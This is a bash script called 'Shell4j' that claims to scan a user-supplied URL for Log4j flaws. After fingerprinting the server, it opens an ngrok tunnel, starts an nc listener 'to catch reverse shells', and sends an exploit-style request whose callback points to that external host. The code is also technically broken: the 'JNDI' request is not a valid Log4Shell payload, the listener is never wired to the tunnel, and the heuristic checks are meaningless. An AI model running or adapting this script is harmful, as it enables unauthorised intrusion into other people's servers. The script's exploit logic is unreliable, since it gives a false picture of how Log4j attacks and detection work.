#!/bin/bash
toilet -F gay Shell4j

# Function to conduct heuristic tests for Log4j vulnerabilities
conduct_heuristic_tests() {
    echo "Heuristic Testing for $url:"
    echo "-------------------------------------"

    # Use cURL to fetch the contents of the URL for heuristic testing
    CONTENTS=$(curl -s "$url")

    # Check if the log4j configuration is exposed in the contents
    if grep -q "log4j\.configuration" <<< "$CONTENTS"; then
      echo "[!] Heuristic (basic) tests show that the log4j configuration may be exposed"
      echo "[?] Exploitation: An attacker may be able to modify the log4j configuration to gain access to sensitive information or execute arbitrary code."
    else
      echo "[!] Heuristic (basic) tests show that the log4j configuration may NOT be exposed"
    fi

    # Check if log4j is vulnerable to log injection
    if grep -q "log4j\.appender\.FILE\.Threshold" <<< "$CONTENTS"; then
      echo "[!] Heuristic (basic) tests show that the URL may be vulnerable to log injection"
      echo "[?] Exploitation: An attacker may be able to inject malicious log entries that can execute arbitrary code or compromise sensitive information."
    else
      echo "[!] Heuristic (basic) tests show that the URL may NOT be vulnerable to log injection"
    fi

    # Check if log4j is vulnerable to log forging
    if grep -q "log4j\.appender\.FILE\.layout\.ConversionPattern" <<< "$CONTENTS"; then
      echo "[!] Heuristic (basic) tests show that the URL may be vulnerable to log forging"
      echo "[?] Exploitation: An attacker may be able to forge log entries to hide their activity or manipulate log data."
    else
      echo "[!] Heuristic (basic) tests show that the URL may NOT be vulnerable to log forging"
    fi

    echo "-------------------------------------"
}

# Prompt user for a URL
read -p "Enter the URL: " url
echo "-------------------------------------"

# Execute heuristic tests
conduct_heuristic_tests

# Extract the domain from the URL
domain=$(echo "$url" | awk -F[/:] '{print $4}')

# Use dig to retrieve the IP address of the web server
ip_address=$(dig +short "$domain" | tail -n1)

# Set the default port based on the URL scheme
if [[ $url == "http://"* ]]; then
    port=80
elif [[ $url == "https://"* ]]; then
    port=443
else
    port=$(curl -sI "$url" | grep -i "location: http" | awk -F: '{print $3}' | tr -d '\r')
fi

# Display the website information
echo "Website Information for $url:"
echo "-------------------------------------"
echo "Web Server Domain: $domain"
echo "Web Server IP Address: $ip_address"
echo "Web Server Port: $port"
echo "-------------------------------------"

# Use curl to retrieve the server type from the HTTP response headers
server_type_header=$(curl -sI "$url" | grep -i "Server:" | awk '{print $2}')

# Use curl to retrieve the HTML content and check for common server identifiers
server_type_html=$(curl -sL "$url" | grep -iE "<meta[^>]*server[^>]*>" | sed -n 's/.*content="\([^"]*\)".*/\1/p')

# Display the detected server type
if [ -n "$server_type_header" ]; then
    serverType="$server_type_header"
    echo "Server Type (from header): $serverType"
    echo "-------------------------------------"
elif [ -n "$server_type_html" ]; then
    serverType="$server_type_html"
    echo "Server Type (from HTML): $serverType"
    echo "-------------------------------------"
else
    echo "[!] Server type not detected. Exiting."
    exit 1
fi

# Specify the URL of the target server for Log4j version check
read -p "Insert URL for Log4j version check: " log4j_url

# Execute Log4j version check
echo "[*] Checking for Log4j presence and version..."
log4jVersion=$(curl -s "$log4j_url" | grep -oP 'org/apache/logging/log4j/.*?jar' | grep -oP '[0-9]+\.[0-9]+\.[0-9]+')

# Check if Log4j version is vulnerable (less than 2.15) or not detected
if [ -z "$log4jVersion" ]; then
    echo "[!] No Log4j library detected. Exiting..."
    exit 1
elif [ $(echo "$log4jVersion" | awk -F. '{print $1*10000 + $2*100 + $3}') -lt 201500 ]; then
    echo "[!] Log4j vulnerability detected. Log4j version: $log4jVersion"
else
    echo "[!] No Log4j vulnerability detected. Log4j version: $log4jVersion"
fi

# Start a public HTTP server using ngrok
ngrok http 8888 > /dev/null 2>&1 &
sleep 5  # Wait for ngrok to start and provide the public URL

# Get the public URL from ngrok
publicUrl=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)

# Detecting Log4j vulnerability
echo "[*] Checking for Log4j vulnerability..."

# Setup a listener to catch reverse shells
nc -l -p 4444 > output.txt &

# Generate a payload file for Log4j vulnerability
echo "Greeting from Log4j!" > payload.txt

# Execute Log4j vulnerability check unconditionally
eval "curl \"$url/jndi-manager/lookup?name=$publicUrl/payload.txt\" > /dev/null 2>&1"

# Wait for the reverse shell to establish
echo "[?] Waiting for the reverse shell to establish..."
sleep 5

# Catch reverse shell output
output=$(cat output.txt)
echo "[+] Reverse shell output: $output"

# Stop listener
echo "[-] Stopping listener..."
killall nc

echo "[-] Stopping ngrok server..."
# Stop ngrok
killall ngrok
